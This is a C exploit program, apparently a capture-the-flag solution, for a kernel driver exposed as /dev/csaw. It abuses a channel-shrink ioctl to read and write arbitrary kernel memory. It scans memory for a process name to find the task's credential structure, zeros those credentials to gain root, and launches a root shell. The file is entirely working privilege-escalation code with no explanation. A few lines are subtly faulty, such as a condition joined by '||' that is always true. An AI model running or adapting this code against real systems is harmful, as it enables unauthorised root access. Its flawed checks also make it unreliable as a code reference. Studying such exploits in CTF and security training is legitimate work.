#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <unistd.h>

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8

struct alloc_channel_args{
    size_t buf_size;
    int id;
};

struct shrink_channel_args{
    int id;
    size_t size;
};

struct read_channel_args{
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args{
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args{
    int id;
    loff_t index;
    int whence;
};

int main(int argc, char *argv[], char *envp[])
{
    struct alloc_channel_args alloc_channel;
    struct shrink_channel_args shrink_channel;
    struct read_channel_args read_channel;
    struct write_channel_args write_channel;
    struct seek_channel_args seek_channel;

    //setvbuf(stdout, 0LL, 2, 0LL);
    char *buf = malloc(0x1000);
    char pid[1];
    size_t addr;
    size_t search;
    size_t cred, real_cred, task_struct;
    char *comm = "De4dCr0wCCxD_pD\0";
    prctl(PR_SET_NAME, comm);

    int fd = open("/dev/csaw", O_RDWR);
    if(fd < 0){
        printf("[-] open dev error!\n");
        return 0;
    }
    alloc_channel.id = -1;
    alloc_channel.buf_size = 0x100;
    ioctl(fd, CSAW_ALLOC_CHANNEL, &alloc_channel);
    if(alloc_channel.id == -1){
        printf("[-] alloc channel failed!\n");
        return 0;
    }

    shrink_channel.id = alloc_channel.id;
    shrink_channel.size = 0x101;
    ioctl(fd, CSAW_SHRINK_CHANNEL, &shrink_channel);

    for(addr = 0xffff880000000000; addr < 0xffffc80000000000; addr += 0x1000){
        seek_channel.id = alloc_channel.id;
        seek_channel.index = addr-0x10;
        seek_channel.whence = SEEK_SET;
        ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

        read_channel.id = alloc_channel.id;
        read_channel.buf = buf;
        read_channel.count = 0x1000;
        ioctl(fd, CSAW_READ_CHANNEL, &read_channel);
        search = memmem(read_channel.buf, 0x1000, comm, 0x10);
        if(search){
            //cred = *(size_t *)(search - 0x8);
            //real_cred = *(size_t *)(search - 0x10);
            cred = *((size_t *)search - 1);
            printf("[+] cred %lx\n",cred);
            real_cred = *((size_t *)search - 2);
            printf("[+] real_cred %lx\n",real_cred);
            if((cred == real_cred) && (cred ||0xff00000000000000)){
                printf("[+] cred %lx\n",cred);
                task_struct = addr + search-(size_t)read_channel.buf;
                printf("[+] task_struct %lx\n",task_struct);
                break;
            }
        }
    }
    pid[0] = '\0'; 
    for(int i = 0; i < 30; i++){
        seek_channel.id = alloc_channel.id;
        seek_channel.index = cred - 0x10 + i;
        seek_channel.whence = SEEK_SET;
        ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

        write_channel.id = alloc_channel.id;
        write_channel.buf = pid;
        write_channel.count = 1;
        ioctl(fd, CSAW_WRITE_CHANNEL, &write_channel);
    }
    if(getuid() == 0){
        printf("[+] get root!\n");
        system("/bin/sh");
    }

    return 0;
}


